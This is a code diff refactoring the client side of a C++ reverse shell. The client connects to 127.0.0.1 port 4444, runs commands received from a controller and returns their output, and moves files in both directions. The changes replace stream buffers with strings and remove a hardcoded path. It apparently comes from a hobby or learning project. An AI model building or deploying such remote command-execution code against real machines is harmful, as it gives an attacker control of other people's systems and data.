@@ -26,7 +26,7 @@ private:
 public:
 
 	Client(IoService& ioService)
-		: m_ioService(ioService), m_socket(ioService), m_path(R"(C:\Users\ariels\Downloads\Src\c.exe)"), m_ShellUtils(this)
+		: m_ioService(ioService), m_socket(ioService), m_ShellUtils(this)
 	{
 		TcpResolver resolver(ioService);
 		m_endpointIterator = resolver.resolve({ "127.0.0.1", "4444" });
@@ -87,9 +87,8 @@ private:
 		auto command = m_ShellUtils.Response();
 		CommandExecuter commandExecuter;
 		auto commandResult = *commandExecuter.RunCommand(command);
-		std::ostream requestStream(&m_requestBuf);
-		requestStream << commandResult << m_ShellUtils.m_delimiter;
-		m_ShellUtils.Send(m_requestBuf);
+		std::string request(commandResult + m_ShellUtils.m_delimiter);
+		m_ShellUtils.Send(request);
 	}
 
 	void Download()
@@ -100,10 +99,9 @@ private:
 			throw std::fstream::failure("Failed while opening file"); // TODO - Throw custom exception exception!
 
 		auto fileSize = std::filesystem::file_size(filePath);
-		std::ostream requestStream(&m_requestBuf);
-		requestStream << fileSize << m_ShellUtils.m_delimiter;
-		
-		m_ShellUtils.Upload(fileSize, m_requestBuf);
+		std::string request(std::to_string(fileSize) + m_ShellUtils.m_delimiter);
+		auto buf = boost::asio::buffer(request);
+		m_ShellUtils.Upload(fileSize, buf);
 	}
 
 	void Upload()
@@ -126,7 +124,6 @@ public: // TODO - Turn this back into private after solving the CommonReverseShe
 	boost::asio::streambuf m_responseBuf;
 	std::array<char, 1024> m_buf;
 	std::fstream m_file;
-	std::string m_path;
 };
 
 #endif // !_CLIENT_H_
